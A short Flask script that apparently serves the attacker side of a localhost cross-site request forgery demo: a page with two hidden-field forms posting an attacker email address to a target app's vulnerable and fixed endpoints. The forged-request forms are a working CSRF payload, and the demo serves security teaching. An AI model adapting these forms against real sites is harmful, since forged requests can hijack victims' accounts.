from flask import Flask

app = Flask(__name__)


@app.get("/")
def attack_page():
    return """<!doctype html>
    <html lang="en">
    <head><meta charset="utf-8"><title>Attacker origin</title></head>
    <body>
      <h1>Attacker origin: port 5001</h1>
      <p>Both forms submit to the target origin on port 5000.</p>

      <form method="post" action="http://127.0.0.1:5000/vuln">
        <input type="hidden" name="email" value="attacker@example.test">
        <button>Forge request to vulnerable endpoint</button>
      </form>

      <form method="post" action="http://127.0.0.1:5000/fixed">
        <input type="hidden" name="email" value="attacker@example.test">
        <button>Try the fixed endpoint</button>
      </form>
    </body>
    </html>"""


app.run(port=5001)
